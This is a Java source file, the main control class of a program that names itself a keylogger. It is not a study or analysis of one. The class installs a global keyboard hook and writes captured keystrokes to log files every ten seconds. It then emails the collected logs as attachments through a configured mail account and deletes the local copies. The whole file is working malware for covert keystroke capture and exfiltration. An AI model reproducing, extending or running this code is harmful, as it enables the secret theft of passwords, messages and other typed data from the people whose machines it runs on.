package com.mossad.keylogger.logic;

import com.mossad.keylogger.files.LogFilesCollector;
import com.mossad.keylogger.logging.LogRecorder;
import com.mossad.keylogger.mail.MailSender;
import com.mossad.keylogger.reader.KeyReader;
import com.mossad.keylogger.timer.WriterTask;
import org.apache.commons.mail.EmailException;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.List;
import java.util.Timer;
import java.util.logging.Logger;

public final class LogicFlow {

    private final Logger LOG = Logger.getLogger(LogicFlow.class.getCanonicalName());
    private final Timer timer;
    private WriterTask writerTask;
    private final KeyReader keyReader;
    private final MailSender mailSender;
    private final LogFilesCollector logFilesCollector;
    private List<String> files;

    public LogicFlow(String mailHostName, String emailAccount, String password) {
        logFilesCollector = new LogFilesCollector();
        mailSender = new MailSender(mailHostName, emailAccount, password);
        timer = new Timer();
        keyReader = new KeyReader();
    }

    public void execute() throws NativeHookException {
        files = logFilesCollector.collectLogs();
        try {
            mailSender.prepareEmailWithAtatchment(files);
            mailSender.send();
            logFilesCollector.removeLogs(files);
        } catch (EmailException e) {
            LOG.info("Mail has not been sent due to: " + e.getMessage());
        }
        GlobalScreen.registerNativeHook();
        writerTask = new WriterTask(keyReader, new LogRecorder());
        GlobalScreen.addNativeKeyListener(keyReader);
        timer.schedule(writerTask, 1000L, 10000L);
    }
}